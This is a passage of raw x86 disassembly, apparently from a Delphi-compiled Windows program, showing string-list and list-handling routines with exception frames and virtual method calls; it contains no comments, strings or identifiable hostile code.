  408258:	55                   	push   %ebp
  408259:	68 84 82 40 00       	push   $0x408284
  40825e:	64 ff 30             	push   %fs:(%eax)
  408261:	64 89 20             	mov    %esp,%fs:(%eax)
  408264:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408267:	8b c3                	mov    %ebx,%eax
  408269:	8b 08                	mov    (%eax),%ecx
  40826b:	ff 51 54             	call   *0x54(%ecx)
  40826e:	33 c0                	xor    %eax,%eax
  408270:	5a                   	pop    %edx
  408271:	59                   	pop    %ecx
  408272:	59                   	pop    %ecx
  408273:	64 89 10             	mov    %edx,%fs:(%eax)
  408276:	68 8b 82 40 00       	push   $0x40828b
  40827b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40827e:	e8 49 a7 ff ff       	call   0x4029cc
  408283:	c3                   	ret
  408284:	e9 d7 aa ff ff       	jmp    0x402d60
  408289:	eb f0                	jmp    0x40827b
  40828b:	5b                   	pop    %ebx
  40828c:	59                   	pop    %ecx
  40828d:	5d                   	pop    %ebp
  40828e:	c3                   	ret
  40828f:	90                   	nop
  408290:	55                   	push   %ebp
  408291:	8b ec                	mov    %esp,%ebp
  408293:	83 c4 f8             	add    $0xfffffff8,%esp
  408296:	53                   	push   %ebx
  408297:	56                   	push   %esi
  408298:	57                   	push   %edi
  408299:	33 c9                	xor    %ecx,%ecx
  40829b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40829e:	8b da                	mov    %edx,%ebx
  4082a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4082a3:	33 c0                	xor    %eax,%eax
  4082a5:	55                   	push   %ebp
  4082a6:	68 2e 83 40 00       	push   $0x40832e
  4082ab:	64 ff 30             	push   %fs:(%eax)
  4082ae:	64 89 20             	mov    %esp,%fs:(%eax)
  4082b1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4082b4:	e8 6b fb ff ff       	call   0x407e24
  4082b9:	33 c0                	xor    %eax,%eax
  4082bb:	55                   	push   %ebp
  4082bc:	68 11 83 40 00       	push   $0x408311
  4082c1:	64 ff 30             	push   %fs:(%eax)
  4082c4:	64 89 20             	mov    %esp,%fs:(%eax)
  4082c7:	8b c3                	mov    %ebx,%eax
  4082c9:	e8 fe 08 00 00       	call   0x408bcc
  4082ce:	8b f0                	mov    %eax,%esi
  4082d0:	8b c3                	mov    %ebx,%eax
  4082d2:	e8 e5 08 00 00       	call   0x408bbc
  4082d7:	2b f0                	sub    %eax,%esi
  4082d9:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4082dc:	8b ce                	mov    %esi,%ecx
  4082de:	33 d2                	xor    %edx,%edx
  4082e0:	e8 db ae ff ff       	call   0x4031c0
  4082e5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4082e8:	8b ce                	mov    %esi,%ecx
  4082ea:	8b c3                	mov    %ebx,%eax
  4082ec:	8b 18                	mov    (%eax),%ebx
  4082ee:	ff 13                	call   *(%ebx)
  4082f0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4082f3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4082f6:	8b 08                	mov    (%eax),%ecx
  4082f8:	ff 51 24             	call   *0x24(%ecx)
  4082fb:	33 c0                	xor    %eax,%eax
  4082fd:	5a                   	pop    %edx
  4082fe:	59                   	pop    %ecx
  4082ff:	59                   	pop    %ecx
  408300:	64 89 10             	mov    %edx,%fs:(%eax)
  408303:	68 18 83 40 00       	push   $0x408318
  408308:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40830b:	e8 cc fb ff ff       	call   0x407edc
  408310:	c3                   	ret
  408311:	e9 4a aa ff ff       	jmp    0x402d60
  408316:	eb f0                	jmp    0x408308
  408318:	33 c0                	xor    %eax,%eax
  40831a:	5a                   	pop    %edx
  40831b:	59                   	pop    %ecx
  40831c:	59                   	pop    %ecx
  40831d:	64 89 10             	mov    %edx,%fs:(%eax)
  408320:	68 35 83 40 00       	push   $0x408335
  408325:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408328:	e8 b3 ad ff ff       	call   0x4030e0
  40832d:	c3                   	ret
  40832e:	e9 2d aa ff ff       	jmp    0x402d60
  408333:	eb f0                	jmp    0x408325
  408335:	5f                   	pop    %edi
  408336:	5e                   	pop    %esi
  408337:	5b                   	pop    %ebx
  408338:	59                   	pop    %ecx
  408339:	59                   	pop    %ecx
  40833a:	5d                   	pop    %ebp
  40833b:	c3                   	ret
  40833c:	55                   	push   %ebp
  40833d:	8b ec                	mov    %esp,%ebp
  40833f:	83 c4 f8             	add    $0xfffffff8,%esp
  408342:	53                   	push   %ebx
  408343:	56                   	push   %esi
  408344:	57                   	push   %edi
  408345:	33 db                	xor    %ebx,%ebx
  408347:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40834a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40834d:	8b f2                	mov    %edx,%esi
  40834f:	8b d8                	mov    %eax,%ebx
  408351:	33 c0                	xor    %eax,%eax
  408353:	55                   	push   %ebp
  408354:	68 a8 83 40 00       	push   $0x4083a8
  408359:	64 ff 30             	push   %fs:(%eax)
  40835c:	64 89 20             	mov    %esp,%fs:(%eax)
  40835f:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  408362:	74 2e                	je     0x408392
  408364:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  408367:	8b d6                	mov    %esi,%edx
  408369:	8b c3                	mov    %ebx,%eax
  40836b:	8b 38                	mov    (%eax),%edi
  40836d:	ff 57 0c             	call   *0xc(%edi)
  408370:	8b d6                	mov    %esi,%edx
  408372:	8b c3                	mov    %ebx,%eax
  408374:	8b 08                	mov    (%eax),%ecx
  408376:	ff 51 14             	call   *0x14(%ecx)
  408379:	8b f8                	mov    %eax,%edi
  40837b:	8b d6                	mov    %esi,%edx
  40837d:	8b c3                	mov    %ebx,%eax
  40837f:	8b 08                	mov    (%eax),%ecx
  408381:	ff 51 3c             	call   *0x3c(%ecx)
  408384:	57                   	push   %edi
  408385:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408388:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40838b:	8b c3                	mov    %ebx,%eax
  40838d:	e8 7a fe ff ff       	call   0x40820c
  408392:	33 c0                	xor    %eax,%eax
  408394:	5a                   	pop    %edx
  408395:	59                   	pop    %ecx
  408396:	59                   	pop    %ecx
  408397:	64 89 10             	mov    %edx,%fs:(%eax)
  40839a:	68 af 83 40 00       	push   $0x4083af
  40839f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4083a2:	e8 39 ad ff ff       	call   0x4030e0
  4083a7:	c3                   	ret
  4083a8:	e9 b3 a9 ff ff       	jmp    0x402d60
  4083ad:	eb f0                	jmp    0x40839f
  4083af:	5f                   	pop    %edi
  4083b0:	5e                   	pop    %esi
  4083b1:	5b                   	pop    %ebx
  4083b2:	59                   	pop    %ecx
  4083b3:	59                   	pop    %ecx
  4083b4:	5d                   	pop    %ebp
  4083b5:	c3                   	ret
  4083b6:	8b c0                	mov    %eax,%eax
  4083b8:	53                   	push   %ebx
  4083b9:	56                   	push   %esi
  4083ba:	57                   	push   %edi
  4083bb:	55                   	push   %ebp
  4083bc:	8b e9                	mov    %ecx,%ebp
  4083be:	8b f2                	mov    %edx,%esi
  4083c0:	8b d8                	mov    %eax,%ebx
  4083c2:	8b d6                	mov    %esi,%edx
  4083c4:	8b c3                	mov    %ebx,%eax
  4083c6:	8b 08                	mov    (%eax),%ecx
  4083c8:	ff 51 14             	call   *0x14(%ecx)
  4083cb:	8b f8                	mov    %eax,%edi
  4083cd:	8b d6                	mov    %esi,%edx
  4083cf:	8b c3                	mov    %ebx,%eax
  4083d1:	8b 08                	mov    (%eax),%ecx
  4083d3:	ff 51 3c             	call   *0x3c(%ecx)
  4083d6:	57                   	push   %edi
  4083d7:	8b cd                	mov    %ebp,%ecx
  4083d9:	8b d6                	mov    %esi,%edx
  4083db:	8b c3                	mov    %ebx,%eax
  4083dd:	e8 2a fe ff ff       	call   0x40820c
  4083e2:	5d                   	pop    %ebp
  4083e3:	5f                   	pop    %edi
  4083e4:	5e                   	pop    %esi
  4083e5:	5b                   	pop    %ebx
  4083e6:	c3                   	ret
  4083e7:	90                   	nop
  4083e8:	c3                   	ret
  4083e9:	8d 40 00             	lea    0x0(%eax),%eax
  4083ec:	55                   	push   %ebp
  4083ed:	8b ec                	mov    %esp,%ebp
  4083ef:	6a 00                	push   $0x0
  4083f1:	53                   	push   %ebx
  4083f2:	56                   	push   %esi
  4083f3:	57                   	push   %edi
  4083f4:	8b da                	mov    %edx,%ebx
  4083f6:	8b f0                	mov    %eax,%esi
  4083f8:	33 c0                	xor    %eax,%eax
  4083fa:	55                   	push   %ebp
  4083fb:	68 52 84 40 00       	push   $0x408452
  408400:	64 ff 30             	push   %fs:(%eax)
  408403:	64 89 20             	mov    %esp,%fs:(%eax)
  408406:	8b c3                	mov    %ebx,%eax
  408408:	e8 6b 0a 00 00       	call   0x408e78
  40840d:	8b c6                	mov    %esi,%eax
  40840f:	8b 10                	mov    (%eax),%edx
  408411:	ff 52 38             	call   *0x38(%edx)
  408414:	eb 14                	jmp    0x40842a
  408416:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408419:	8b c3                	mov    %ebx,%eax
  40841b:	e8 a4 0a 00 00       	call   0x408ec4
  408420:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408423:	8b c6                	mov    %esi,%eax
  408425:	8b 08                	mov    (%eax),%ecx
  408427:	ff 51 2c             	call   *0x2c(%ecx)
  40842a:	8b c3                	mov    %ebx,%eax
  40842c:	e8 af 09 00 00       	call   0x408de0
  408431:	84 c0                	test   %al,%al
  408433:	74 e1                	je     0x408416
  408435:	8b c3                	mov    %ebx,%eax
  408437:	e8 44 0a 00 00       	call   0x408e80
  40843c:	33 c0                	xor    %eax,%eax
  40843e:	5a                   	pop    %edx
  40843f:	59                   	pop    %ecx
  408440:	59                   	pop    %ecx
  408441:	64 89 10             	mov    %edx,%fs:(%eax)
  408444:	68 59 84 40 00       	push   $0x408459
  408449:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40844c:	e8 8f ac ff ff       	call   0x4030e0
  408451:	c3                   	ret
  408452:	e9 09 a9 ff ff       	jmp    0x402d60
  408457:	eb f0                	jmp    0x408449
  408459:	5f                   	pop    %edi
  40845a:	5e                   	pop    %esi
  40845b:	5b                   	pop    %ebx
  40845c:	59                   	pop    %ecx
  40845d:	5d                   	pop    %ebp
  40845e:	c3                   	ret
  40845f:	90                   	nop
  408460:	55                   	push   %ebp
  408461:	8b ec                	mov    %esp,%ebp
  408463:	51                   	push   %ecx
  408464:	53                   	push   %ebx
  408465:	8b d8                	mov    %eax,%ebx
  408467:	68 ff ff 00 00       	push   $0xffff
  40846c:	8b ca                	mov    %edx,%ecx
  40846e:	b8 44 7a 40 00       	mov    $0x407a44,%eax
  408473:	b2 01                	mov    $0x1,%dl
  408475:	e8 ea 07 00 00       	call   0x408c64
  40847a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40847d:	33 c0                	xor    %eax,%eax
  40847f:	55                   	push   %ebp
  408480:	68 ab 84 40 00       	push   $0x4084ab
  408485:	64 ff 30             	push   %fs:(%eax)
  408488:	64 89 20             	mov    %esp,%fs:(%eax)
  40848b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40848e:	8b c3                	mov    %ebx,%eax
  408490:	8b 08                	mov    (%eax),%ecx
  408492:	ff 51 60             	call   *0x60(%ecx)
  408495:	33 c0                	xor    %eax,%eax
  408497:	5a                   	pop    %edx
  408498:	59                   	pop    %ecx
  408499:	59                   	pop    %ecx
  40849a:	64 89 10             	mov    %edx,%fs:(%eax)
  40849d:	68 b2 84 40 00       	push   $0x4084b2
  4084a2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4084a5:	e8 22 a5 ff ff       	call   0x4029cc
  4084aa:	c3                   	ret
  4084ab:	e9 b0 a8 ff ff       	jmp    0x402d60
  4084b0:	eb f0                	jmp    0x4084a2
  4084b2:	5b                   	pop    %ebx
  4084b3:	59                   	pop    %ecx
  4084b4:	5d                   	pop    %ebp
  4084b5:	c3                   	ret
  4084b6:	8b c0                	mov    %eax,%eax
  4084b8:	55                   	push   %ebp
  4084b9:	8b ec                	mov    %esp,%ebp
  4084bb:	6a 00                	push   $0x0
  4084bd:	53                   	push   %ebx
  4084be:	56                   	push   %esi
  4084bf:	57                   	push   %edi
  4084c0:	8b f2                	mov    %edx,%esi
  4084c2:	8b d8                	mov    %eax,%ebx
  4084c4:	33 c0                	xor    %eax,%eax
  4084c6:	55                   	push   %ebp
  4084c7:	68 0d 85 40 00       	push   $0x40850d
  4084cc:	64 ff 30             	push   %fs:(%eax)
  4084cf:	64 89 20             	mov    %esp,%fs:(%eax)
  4084d2:	8b c3                	mov    %ebx,%eax
  4084d4:	8b 10                	mov    (%eax),%edx
  4084d6:	ff 52 44             	call   *0x44(%edx)
  4084d9:	8b d0                	mov    %eax,%edx
  4084db:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4084de:	e8 29 ad ff ff       	call   0x40320c
  4084e3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4084e6:	e8 69 ad ff ff       	call   0x403254
  4084eb:	8b c8                	mov    %eax,%ecx
  4084ed:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4084f0:	8b c6                	mov    %esi,%eax
  4084f2:	e8 09 07 00 00       	call   0x408c00
  4084f7:	33 c0                	xor    %eax,%eax
  4084f9:	5a                   	pop    %edx
  4084fa:	59                   	pop    %ecx
  4084fb:	59                   	pop    %ecx
  4084fc:	64 89 10             	mov    %edx,%fs:(%eax)
  4084ff:	68 14 85 40 00       	push   $0x408514
  408504:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408507:	e8 d4 ab ff ff       	call   0x4030e0
  40850c:	c3                   	ret
  40850d:	e9 4e a8 ff ff       	jmp    0x402d60
  408512:	eb f0                	jmp    0x408504
  408514:	5f                   	pop    %edi
  408515:	5e                   	pop    %esi
  408516:	5b                   	pop    %ebx
  408517:	59                   	pop    %ecx
  408518:	5d                   	pop    %ebp
  408519:	c3                   	ret
  40851a:	8b c0                	mov    %eax,%eax
  40851c:	55                   	push   %ebp
  40851d:	8b ec                	mov    %esp,%ebp
  40851f:	6a 00                	push   $0x0
  408521:	53                   	push   %ebx
  408522:	56                   	push   %esi
  408523:	57                   	push   %edi
  408524:	8b f2                	mov    %edx,%esi
  408526:	8b d8                	mov    %eax,%ebx
  408528:	33 c0                	xor    %eax,%eax
  40852a:	55                   	push   %ebp
  40852b:	68 60 85 40 00       	push   $0x408560
  408530:	64 ff 30             	push   %fs:(%eax)
  408533:	64 89 20             	mov    %esp,%fs:(%eax)
  408536:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408539:	8b d6                	mov    %esi,%edx
  40853b:	e8 cc ac ff ff       	call   0x40320c
  408540:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408543:	8b c3                	mov    %ebx,%eax
  408545:	8b 08                	mov    (%eax),%ecx
  408547:	ff 51 24             	call   *0x24(%ecx)
  40854a:	33 c0                	xor    %eax,%eax
  40854c:	5a                   	pop    %edx
  40854d:	59                   	pop    %ecx
  40854e:	59                   	pop    %ecx
  40854f:	64 89 10             	mov    %edx,%fs:(%eax)
  408552:	68 67 85 40 00       	push   $0x408567
  408557:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40855a:	e8 81 ab ff ff       	call   0x4030e0
  40855f:	c3                   	ret
  408560:	e9 fb a7 ff ff       	jmp    0x402d60
  408565:	eb f0                	jmp    0x408557
  408567:	5f                   	pop    %edi
  408568:	5e                   	pop    %esi
  408569:	5b                   	pop    %ebx
  40856a:	59                   	pop    %ecx
  40856b:	5d                   	pop    %ebp
  40856c:	c3                   	ret
  40856d:	8d 40 00             	lea    0x0(%eax),%eax
  408570:	55                   	push   %ebp
  408571:	8b ec                	mov    %esp,%ebp
  408573:	83 c4 f8             	add    $0xfffffff8,%esp
  408576:	53                   	push   %ebx
  408577:	56                   	push   %esi
  408578:	57                   	push   %edi
  408579:	33 c9                	xor    %ecx,%ecx
  40857b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40857e:	8b da                	mov    %edx,%ebx
  408580:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408583:	33 c0                	xor    %eax,%eax
  408585:	55                   	push   %ebp
  408586:	68 26 86 40 00       	push   $0x408626
  40858b:	64 ff 30             	push   %fs:(%eax)
  40858e:	64 89 20             	mov    %esp,%fs:(%eax)
  408591:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408594:	e8 8b f8 ff ff       	call   0x407e24
  408599:	33 d2                	xor    %edx,%edx
  40859b:	55                   	push   %ebp
  40859c:	68 09 86 40 00       	push   $0x408609
  4085a1:	64 ff 32             	push   %fs:(%edx)
  4085a4:	64 89 22             	mov    %esp,%fs:(%edx)
  4085a7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4085aa:	8b 10                	mov    (%eax),%edx
  4085ac:	ff 52 38             	call   *0x38(%edx)
  4085af:	85 db                	test   %ebx,%ebx
  4085b1:	74 40                	je     0x4085f3
  4085b3:	eb 39                	jmp    0x4085ee
  4085b5:	8b c3                	mov    %ebx,%eax
  4085b7:	eb 01                	jmp    0x4085ba
  4085b9:	43                   	inc    %ebx
  4085ba:	8a 13                	mov    (%ebx),%dl
  4085bc:	84 d2                	test   %dl,%dl
  4085be:	74 0a                	je     0x4085ca
  4085c0:	80 ea 0a             	sub    $0xa,%dl
  4085c3:	74 05                	je     0x4085ca
  4085c5:	80 ea 03             	sub    $0x3,%dl
  4085c8:	75 ef                	jne    0x4085b9
  4085ca:	8b cb                	mov    %ebx,%ecx
  4085cc:	2b c8                	sub    %eax,%ecx
  4085ce:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4085d1:	92                   	xchg   %eax,%edx
  4085d2:	e8 e9 ab ff ff       	call   0x4031c0
  4085d7:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4085da:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4085dd:	8b 08                	mov    (%eax),%ecx
  4085df:	ff 51 2c             	call   *0x2c(%ecx)
  4085e2:	80 3b 0d             	cmpb   $0xd,(%ebx)
  4085e5:	75 01                	jne    0x4085e8
  4085e7:	43                   	inc    %ebx
  4085e8:	80 3b 0a             	cmpb   $0xa,(%ebx)
  4085eb:	75 01                	jne    0x4085ee
  4085ed:	43                   	inc    %ebx
  4085ee:	80 3b 00             	cmpb   $0x0,(%ebx)
  4085f1:	75 c2                	jne    0x4085b5
  4085f3:	33 c0                	xor    %eax,%eax
  4085f5:	5a                   	pop    %edx
  4085f6:	59                   	pop    %ecx
  4085f7:	59                   	pop    %ecx
  4085f8:	64 89 10             	mov    %edx,%fs:(%eax)
  4085fb:	68 10 86 40 00       	push   $0x408610
  408600:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408603:	e8 d4 f8 ff ff       	call   0x407edc
  408608:	c3                   	ret
  408609:	e9 52 a7 ff ff       	jmp    0x402d60
  40860e:	eb f0                	jmp    0x408600
  408610:	33 c0                	xor    %eax,%eax
  408612:	5a                   	pop    %edx
  408613:	59                   	pop    %ecx
  408614:	59                   	pop    %ecx
  408615:	64 89 10             	mov    %edx,%fs:(%eax)
  408618:	68 2d 86 40 00       	push   $0x40862d
  40861d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408620:	e8 bb aa ff ff       	call   0x4030e0
  408625:	c3                   	ret
  408626:	e9 35 a7 ff ff       	jmp    0x402d60
  40862b:	eb f0                	jmp    0x40861d
  40862d:	5f                   	pop    %edi
  40862e:	5e                   	pop    %esi
  40862f:	5b                   	pop    %ebx
  408630:	59                   	pop    %ecx
  408631:	59                   	pop    %ecx
  408632:	5d                   	pop    %ebp
  408633:	c3                   	ret
  408634:	c3                   	ret
  408635:	8d 40 00             	lea    0x0(%eax),%eax
  408638:	55                   	push   %ebp
  408639:	8b ec                	mov    %esp,%ebp
  40863b:	83 c4 f4             	add    $0xfffffff4,%esp
  40863e:	53                   	push   %ebx
  40863f:	56                   	push   %esi
  408640:	57                   	push   %edi
  408641:	33 c9                	xor    %ecx,%ecx
  408643:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  408646:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408649:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40864c:	33 c0                	xor    %eax,%eax
  40864e:	55                   	push   %ebp
  40864f:	68 ae 86 40 00       	push   $0x4086ae
  408654:	64 ff 30             	push   %fs:(%eax)
  408657:	64 89 20             	mov    %esp,%fs:(%eax)
  40865a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40865d:	e8 1a 0b 00 00       	call   0x40917c
  408662:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408665:	8b 10                	mov    (%eax),%edx
  408667:	ff 52 10             	call   *0x10(%edx)
  40866a:	8b d8                	mov    %eax,%ebx
  40866c:	4b                   	dec    %ebx
  40866d:	85 db                	test   %ebx,%ebx
  40866f:	7c 1f                	jl     0x408690
  408671:	43                   	inc    %ebx
  408672:	33 f6                	xor    %esi,%esi
  408674:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  408677:	8b d6                	mov    %esi,%edx
  408679:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40867c:	8b 38                	mov    (%eax),%edi
  40867e:	ff 57 0c             	call   *0xc(%edi)
  408681:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408684:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408687:	e8 00 0b 00 00       	call   0x40918c
  40868c:	46                   	inc    %esi
  40868d:	4b                   	dec    %ebx
  40868e:	75 e4                	jne    0x408674
  408690:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408693:	e8 ec 0a 00 00       	call   0x409184
  408698:	33 c0                	xor    %eax,%eax
  40869a:	5a                   	pop    %edx
  40869b:	59                   	pop    %ecx
  40869c:	59                   	pop    %ecx
  40869d:	64 89 10             	mov    %edx,%fs:(%eax)
  4086a0:	68 b5 86 40 00       	push   $0x4086b5
  4086a5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4086a8:	e8 33 aa ff ff       	call   0x4030e0
  4086ad:	c3                   	ret
  4086ae:	e9 ad a6 ff ff       	jmp    0x402d60
  4086b3:	eb f0                	jmp    0x4086a5
  4086b5:	5f                   	pop    %edi
  4086b6:	5e                   	pop    %esi
  4086b7:	5b                   	pop    %ebx
  4086b8:	8b e5                	mov    %ebp,%esp
  4086ba:	5d                   	pop    %ebp
  4086bb:	c3                   	ret
  4086bc:	53                   	push   %ebx
  4086bd:	56                   	push   %esi
  4086be:	8b da                	mov    %edx,%ebx
  4086c0:	8b f0                	mov    %eax,%esi
  4086c2:	33 c0                	xor    %eax,%eax
  4086c4:	89 46 18             	mov    %eax,0x18(%esi)
  4086c7:	89 46 1c             	mov    %eax,0x1c(%esi)
  4086ca:	33 c0                	xor    %eax,%eax
  4086cc:	89 46 20             	mov    %eax,0x20(%esi)
  4086cf:	89 46 24             	mov    %eax,0x24(%esi)
  4086d2:	8b 46 0c             	mov    0xc(%esi),%eax
  4086d5:	85 c0                	test   %eax,%eax
  4086d7:	74 10                	je     0x4086e9
  4086d9:	8b 56 08             	mov    0x8(%esi),%edx
  4086dc:	8b c8                	mov    %eax,%ecx
  4086de:	b8 64 78 40 00       	mov    $0x407864,%eax
  4086e3:	92                   	xchg   %eax,%edx
  4086e4:	e8 0f af ff ff       	call   0x4035f8
  4086e9:	33 c0                	xor    %eax,%eax
  4086eb:	89 46 0c             	mov    %eax,0xc(%esi)
  4086ee:	33 d2                	xor    %edx,%edx
  4086f0:	8b c6                	mov    %esi,%eax
  4086f2:	e8 6d 04 00 00       	call   0x408b64
  4086f7:	84 db                	test   %bl,%bl
  4086f9:	74 07                	je     0x408702
  4086fb:	8b c6                	mov    %esi,%eax
  4086fd:	e8 aa a4 ff ff       	call   0x402bac
  408702:	8b c6                	mov    %esi,%eax
  408704:	5e                   	pop    %esi
  408705:	5b                   	pop    %ebx
  408706:	c3                   	ret
  408707:	90                   	nop
  408708:	53                   	push   %ebx
  408709:	56                   	push   %esi
  40870a:	57                   	push   %edi
  40870b:	51                   	push   %ecx
  40870c:	8b f2                	mov    %edx,%esi
  40870e:	8b d8                	mov    %eax,%ebx
  408710:	80 7b 14 00          	cmpb   $0x0,0x14(%ebx)
  408714:	75 08                	jne    0x40871e
  408716:	8b 43 0c             	mov    0xc(%ebx),%eax
  408719:	89 04 24             	mov    %eax,(%esp)
  40871c:	eb 26                	jmp    0x408744
  40871e:	8b cc                	mov    %esp,%ecx
  408720:	8b d6                	mov    %esi,%edx
  408722:	8b c3                	mov    %ebx,%eax
  408724:	8b 38                	mov    (%eax),%edi
  408726:	ff 57 70             	call   *0x70(%edi)
  408729:	84 c0                	test   %al,%al
  40872b:	74 17                	je     0x408744
  40872d:	8a 43 15             	mov    0x15(%ebx),%al
  408730:	2c 01                	sub    $0x1,%al
  408732:	72 1c                	jb     0x408750
  408734:	fe c8                	dec    %al
  408736:	74 02                	je     0x40873a
  408738:	eb 0a                	jmp    0x408744
  40873a:	b8 0e f0 00 00       	mov    $0xf00e,%eax
  40873f:	e8 18 f3 ff ff       	call   0x407a5c
  408744:	8b ce                	mov    %esi,%ecx
  408746:	8b 14 24             	mov    (%esp),%edx
  408749:	8b c3                	mov    %ebx,%eax
  40874b:	e8 78 02 00 00       	call   0x4089c8
  408750:	8b 04 24             	mov    (%esp),%eax
  408753:	5a                   	pop    %edx
  408754:	5f                   	pop    %edi
  408755:	5e                   	pop    %esi
  408756:	5b                   	pop    %ebx
  408757:	c3                   	ret
  408758:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  40875c:	75 11                	jne    0x40876f
  40875e:	66 83 78 1a 00       	cmpw   $0x0,0x1a(%eax)
  408763:	74 0a                	je     0x40876f
  408765:	8b c8                	mov    %eax,%ecx
  408767:	8b d0                	mov    %eax,%edx
  408769:	8b 41 1c             	mov    0x1c(%ecx),%eax
  40876c:	ff 51 18             	call   *0x18(%ecx)
  40876f:	c3                   	ret
  408770:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  408774:	75 11                	jne    0x408787
  408776:	66 83 78 22 00       	cmpw   $0x0,0x22(%eax)
  40877b:	74 0a                	je     0x408787
  40877d:	8b c8                	mov    %eax,%ecx
  40877f:	8b d0                	mov    %eax,%edx
  408781:	8b 41 24             	mov    0x24(%ecx),%eax
  408784:	ff 51 20             	call   *0x20(%ecx)
  408787:	c3                   	ret
  408788:	53                   	push   %ebx
  408789:	8b d8                	mov    %eax,%ebx
  40878b:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40878f:	74 2c                	je     0x4087bd
  408791:	8b c3                	mov    %ebx,%eax
  408793:	8b 10                	mov    (%eax),%edx
  408795:	ff 52 6c             	call   *0x6c(%edx)
  408798:	8b 43 08             	mov    0x8(%ebx),%eax
  40879b:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  40879e:	ba 64 78 40 00       	mov    $0x407864,%edx
  4087a3:	e8 50 ae ff ff       	call   0x4035f8
  4087a8:	33 c0                	xor    %eax,%eax
  4087aa:	89 43 0c             	mov    %eax,0xc(%ebx)
  4087ad:	33 d2                	xor    %edx,%edx
  4087af:	8b c3                	mov    %ebx,%eax
  4087b1:	e8 ae 03 00 00       	call   0x408b64
  4087b6:	8b c3                	mov    %ebx,%eax
  4087b8:	8b 10                	mov    (%eax),%edx
  4087ba:	ff 52 68             	call   *0x68(%edx)
  4087bd:	5b                   	pop    %ebx
  4087be:	c3                   	ret
  4087bf:	90                   	nop
  4087c0:	53                   	push   %ebx
  4087c1:	56                   	push   %esi
  4087c2:	8b f2                	mov    %edx,%esi
  4087c4:	8b d8                	mov    %eax,%ebx
  4087c6:	85 f6                	test   %esi,%esi
  4087c8:	7c 05                	jl     0x4087cf
  4087ca:	3b 73 0c             	cmp    0xc(%ebx),%esi
  4087cd:	7c 05                	jl     0x4087d4
  4087cf:	e8 a0 f2 ff ff       	call   0x407a74
  4087d4:	8b c3                	mov    %ebx,%eax
  4087d6:	8b 10                	mov    (%eax),%edx
  4087d8:	ff 52 6c             	call   *0x6c(%edx)
  4087db:	8b 43 08             	mov    0x8(%ebx),%eax
  4087de:	8d 04 f0             	lea    (%eax,%esi,8),%eax
  4087e1:	ba 64 78 40 00       	mov    $0x407864,%edx
  4087e6:	e8 95 ae ff ff       	call   0x403680
  4087eb:	ff 4b 0c             	decl   0xc(%ebx)
  4087ee:	8b 43 0c             	mov    0xc(%ebx),%eax
  4087f1:	3b f0                	cmp    %eax,%esi
  4087f3:	7d 19                	jge    0x40880e
  4087f5:	2b c6                	sub    %esi,%eax
  4087f7:	8b c8                	mov    %eax,%ecx
  4087f9:	c1 e1 03             	shl    $0x3,%ecx
  4087fc:	8b 43 08             	mov    0x8(%ebx),%eax
  4087ff:	8d 14 f0             	lea    (%eax,%esi,8),%edx
  408802:	8b 43 08             	mov    0x8(%ebx),%eax
  408805:	8d 44 f0 08          	lea    0x8(%eax,%esi,8),%eax
  408809:	e8 ba 9e ff ff       	call   0x4026c8
  40880e:	8b c3                	mov    %ebx,%eax
  408810:	8b 10                	mov    (%eax),%edx
  408812:	ff 52 68             	call   *0x68(%edx)
  408815:	5e                   	pop    %esi
  408816:	5b                   	pop    %ebx
  408817:	c3                   	ret
  408818:	53                   	push   %ebx
  408819:	56                   	push   %esi
  40881a:	57                   	push   %edi
  40881b:	8b f9                	mov    %ecx,%edi
  40881d:	8b f2                	mov    %edx,%esi
  40881f:	8b d8                	mov    %eax,%ebx
  408821:	85 f6                	test   %esi,%esi
  408823:	7c 0e                	jl     0x408833
